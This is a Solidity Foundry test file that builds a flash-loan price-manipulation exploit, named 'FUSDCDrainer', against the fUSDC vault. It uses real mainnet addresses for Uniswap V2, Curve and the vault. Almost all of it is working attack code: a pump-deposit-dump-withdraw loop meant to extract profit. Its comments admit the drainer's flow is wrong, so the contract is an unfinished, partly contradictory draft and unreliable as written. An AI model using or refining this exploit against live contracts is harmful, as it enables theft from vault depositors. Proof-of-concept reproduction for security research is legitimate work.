// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

interface IUniV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract FUSDCDrainer {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;
    address constant UNI_DAI_WETH = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    // DAI is token0 in this pair

    uint256 public flashDAI;
    uint256 public iterations;

    function execute(uint256 _flashDAI, uint256 _iterations) external {
        flashDAI = _flashDAI;
        iterations = _iterations;
        
        // Flash borrow DAI from UniV2 DAI/WETH
        IUniV2Pair(UNI_DAI_WETH).swap(
            _flashDAI,  // amount0Out = DAI
            0,          // amount1Out = WETH
            address(this),
            abi.encode(uint256(1)) // trigger callback
        );
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == UNI_DAI_WETH, "not pair");
        
        IERC20(DAI).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(FUSDC, type(uint256).max);

        for (uint256 i = 0; i < iterations; i++) {
            uint256 daiBal = IERC20(DAI).balanceOf(address(this));
            if (daiBal < 1e18) break;

            // 1. PUMP: DAI -> USDC on Curve (modifies pool ratio)
            uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(0, 1, daiBal, 0);
            uint256 usdcGained = IERC20(USDC).balanceOf(address(this)) - usdcBefore;

            // 2. DEPOSIT USDC into fUSDC vault
            IHVault(FUSDC).deposit(usdcGained);
            uint256 shares = IHVault(FUSDC).balanceOf(address(this));

            // 3. DUMP: USDC -> DAI on Curve (reverse manipulation)
            // We need some USDC for the dump - use a portion of what we just got
            // Actually, we deposited ALL the USDC. So we need DAI for the dump.
            // Wait - we have no DAI left (we swapped it all) and deposited all USDC.
            // This is the wrong flow. Let me restructure:
            // 
            // Better flow:
            // 1. Swap HALF DAI -> USDC (pump)
            // 2. Deposit received USDC at manipulated price
            // 3. Swap remaining DAI -> ... no that doesn't work either
            //
            // The correct flow from the original fUSDT attack:
            // Flash both USDC and DAI
            // 1. Swap DAI -> USDC on Curve (pump USDC side)
            // 2. Deposit received USDC into fUSDC
            // 3. Swap USDC -> DAI on Curve (dump/restore)
            // 4. Withdraw from fUSDC

            // For this iteration: just withdraw and break to see if basic flow works
            IHVault(FUSDC).withdraw(shares);
            
            // Get DAI back for next iter: swap some USDC -> DAI
            uint256 usdcNow = IERC20(USDC).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(1, 0, usdcNow, 0);
        }

        // Repay flash: DAI + 0.3% fee
        uint256 repay = (flashDAI * 1000 / 997) + 1;
        IERC20(DAI).transfer(UNI_DAI_WETH, repay);
    }
}

contract TestFUSDCFlash is Test {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    /// @dev Test the refined approach: flash DAI, do pump-deposit-dump-withdraw
    function testRefinedFUSDCDrain() public {
        // First, let's understand the correct flow with deal()
        // The fUSDT attack used USDC to pump USDT price, then deposited USDT
        // For fUSDC: we use DAI to pump (DAI->USDC swap depletes USDC from pool)
        
        // Actually let me re-examine: the successful test did:
        // 1. deal 15M DAI + 100M USDC
        // 2. Swap 15M DAI -> USDC (got 15M USDC, PPFS dropped 980074 -> 978881)
        // 3. Deposit pumped USDC at LOW ppfs -> MORE shares
        // 4. Swap 15M USDC -> DAI (ppfs went to 979962, close to original)
        // 5. Withdraw at restored ppfs -> profit
        
        // So the flow is:
        // Flash: DAI (for pump) + USDC (for dump)
        // OR: Flash DAI, use DAI->USDC to get pump USDC, keep some USDC for deposit
        
        // Let me test: flash DAI from UniV2, also flash USDC from UniV2 USDC/WETH
        
        // Simpler test with deal first:
        uint256 daiFlash = 15_000_000e18;
        uint256 usdcCapital = 15_000_000e6;
        
        deal(DAI, address(this), daiFlash);
        deal(USDC, address(this), usdcCapital);
        
        IERC20(DAI).approve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51, type(uint256).max);
        IERC20(USDC).approve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51, type(uint256).max);
        IERC20(USDC).approve(FUSDC, type(uint256).max);
        
        uint256 totalUsdcProfit = 0;
        
        for (uint256 i = 0; i < 5; i++) {
            uint256 ppfsBefore = IHVault(FUSDC).getPricePerFullShare();
            
            // PUMP: DAI -> USDC on Curve
            uint256 daiBal = IERC20(DAI).balanceOf(address(this));
            uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
            ICurveYPool(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51).exchange_underlying(0, 1, daiBal, 0);
            uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;
            
            uint256 ppfsAfterPump = IHVault(FUSDC).getPricePerFullShare();
            
            // DEPOSIT pumped USDC (at manipulated price)
            IHVault(FUSDC).deposit(pumpedUSDC);
            uint256 shares = IHVault(FUSDC).balanceOf(address(this));
            
            // DUMP: USDC -> DAI (reverse, using our capital USDC)
            uint256 usdcForDump = IERC20(USDC).balanceOf(address(this));
            if (usdcForDump > usdcCapital) usdcForDump = usdcCapital;
            ICurveYPool(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51).exchange_underlying(1, 0, usdcForDump, 0);
            
            uint256 ppfsAfterDump = IHVault(FUSDC).getPricePerFullShare();
            
            // WITHDRAW
            IHVault(FUSDC).withdraw(shares);
            
            uint256 usdcAfter = IERC20(USDC).balanceOf(address(this));
            uint256 iterProfit = usdcAfter > usdcCapital ? usdcAfter - usdcCapital : 0;
            
            emit log_named_uint("Iter", i);
            emit log_named_uint("PPFS before", ppfsBefore);
            emit log_named_uint("PPFS after pump", ppfsAfterPump);
            emit log_named_uint("PPFS after dump", ppfsAfterDump);
            emit log_named_uint("USDC after", usdcAfter);
            emit log_named_uint("DAI after", IERC20(DAI).balanceOf(address(this)));
        }
        
        uint256 finalUSDC = IERC20(USDC).balanceOf(address(this));
        uint256 finalDAI = IERC20(DAI).balanceOf(address(this));
        emit log_named_uint("Final USDC", finalUSDC);
        emit log_named_uint("Final DAI", finalDAI);
        emit log_named_int("Net USDC vs capital", int256(finalUSDC) - int256(usdcCapital));
        emit log_named_int("Net DAI vs flash", int256(finalDAI) - int256(daiFlash));
    }

}
